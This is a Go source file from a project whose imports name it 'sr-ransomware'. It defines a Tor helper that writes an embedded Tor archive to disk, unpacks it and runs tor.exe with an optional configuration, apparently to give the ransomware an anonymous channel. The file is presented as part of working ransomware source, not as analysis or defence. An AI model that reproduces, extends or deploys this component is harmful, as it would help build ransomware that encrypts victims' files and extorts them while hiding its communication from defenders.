package exe

import (
    "os"
    "os/exec"
    "path/filepath"

    "github.com/sug0/sr-ransomware/go/fs"
    "github.com/sug0/sr-ransomware/go/errors"
)

type Tor struct {
    cmd    *exec.Cmd
    path   string
    config string
}

func NewTor(path, config string) *Tor {
    return &Tor{path: path, config: config}
}

func (t *Tor) Start() error {
    if t.cmd != nil {
        return ErrAlreadyRunning
    }
    torExePath := filepath.Join(t.path, "tor.exe")
    if _, err := os.Stat(torExePath); err != nil {
        err = t.extract()
        if err != nil {
            return err
        }
    }
    if t.config != "" {
        t.cmd = exec.Command(torExePath, "-f", t.config)
    } else {
        t.cmd = exec.Command(torExePath)
    }
    return errors.WrapIfNotNil(pkg, "failed to start tor", t.cmd.Start())
}

func (t *Tor) Close() error {
    if t.cmd != nil {
        t.cmd.Process.Signal(os.Kill)
        return t.cmd.Wait()
    }
    return nil
}

func (t *Tor) extract() error {
    torZipPath := filepath.Join(t.path, "tor.zip")
    f, err := os.Create(torZipPath)
    if err != nil {
        return errors.Wrap(pkg, "failed to create tor zip", err)
    }
    defer f.Close()
    _, err = f.Write(torZIP)
    if err != nil {
        return errors.Wrap(pkg, "failed to write tor zip", err)
    }
    err = fs.Unzip(t.path, torZipPath)
    if err != nil {
        return errors.Wrap(pkg, "failed to unzip tor", err)
    }
    return errors.WrapIfNotNil(pkg, "failed to delete tor zip", os.Remove(torZipPath))
}
